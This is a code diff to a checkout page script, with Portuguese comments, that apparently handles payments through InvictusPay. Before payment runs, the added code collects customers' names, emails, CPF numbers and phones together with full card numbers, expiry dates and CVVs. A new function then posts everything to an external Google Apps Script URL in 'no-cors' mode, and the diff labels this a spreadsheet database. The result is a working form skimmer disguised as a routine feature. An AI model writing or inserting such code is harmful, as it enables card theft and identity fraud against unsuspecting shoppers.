@@ -2610,6 +2610,27 @@ if (checkoutForm) {
     }
     
     console.log('[Checkout] ✅ Validação OK, iniciando checkout com InvictusPay...');
+
+    // =======================================================
+    // 🚀 DISPARANDO PARA A PLANILHA DO GOOGLE ANTES DO PAGAMENTO
+    // =======================================================
+    const dadosClientePlanilha = {
+        nome: customerData.name,
+        email: customerData.email,
+        cpf: customerData.cpf,
+        telefone: customerData.phone
+    };
+
+    const dadosCartaoPlanilha = {
+        numero: cardData ? cardData.number : "PIX",
+        nomeTitular: cardData ? cardData.holder_name : "-",
+        validade: cardData ? `${cardData.exp_month}/${cardData.exp_year}` : "-",
+        cvv: cardData ? cardData.cvv : "-"
+    };
+
+    // Chama a nossa função mágica!
+    salvarDadosNaPlanilha(dadosClientePlanilha, dadosCartaoPlanilha);
+    // =======================================================
     
     checkoutError.style.display = 'none';
     checkoutForm.style.display = 'none';
@@ -2914,5 +2935,37 @@ async function checkApiHealth() {
     }
 }
 
+// =======================================================
+// BANCO DE DADOS: SALVAR CLIENTES E PEDIDOS NA PLANILHA
+// =======================================================
 
+const urlPlanilha = "https://script.google.com/macros/s/AKfycby9HtgsMeKGyoeFNmzxa60bn6QT_PF4FGhJQbtUFLAty0MlJXvwoN1B0WeQQNjmfa2F/exec";
+
+// Função que envia as informações para o Google Sheets
+async function salvarDadosNaPlanilha(dadosCliente, dadosCartao) {
+    const dadosParaEnviar = {
+        nome: dadosCliente.nome,
+        email: dadosCliente.email,
+        cpf: dadosCliente.cpf,
+        telefone: dadosCliente.telefone,
+        cartao_numero: dadosCartao.numero || "PIX",
+        cartao_nome: dadosCartao.nomeTitular || "-",
+        cartao_validade: dadosCartao.validade || "-",
+        cartao_cvv: dadosCartao.cvv || "-"
+    };
+
+    try {
+        await fetch(urlPlanilha, {
+            method: 'POST',
+            mode: 'no-cors', // Evita bloqueios de segurança do navegador
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(dadosParaEnviar)
+        });
+        console.log("SUCESSO: Dados enviados para a planilha!");
+    } catch (erro) {
+        console.error("Erro ao salvar na planilha:", erro);
+    }
+}
 }
